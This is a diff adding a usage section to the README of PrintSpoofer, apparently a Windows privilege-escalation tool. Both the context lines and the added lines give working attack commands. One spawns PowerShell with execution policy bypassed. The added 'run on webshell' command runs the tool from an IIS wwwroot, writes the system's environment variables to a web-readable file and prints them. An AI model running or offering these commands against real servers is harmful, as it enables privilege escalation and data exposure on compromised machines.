@@ -98,3 +98,9 @@ C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
 ```
+
+### Usage 4: run on webshell
+
+```
+/c C:\inetpub\wwwroot\PrintSpoofer.exe -c "c:\\windows\\system32\\cmd.exe /c set > C:\\inetpub\\wwwroot\\tmp.txt & exit" && type C:\\inetpub\\wwwroot\\tmp.txt
+```
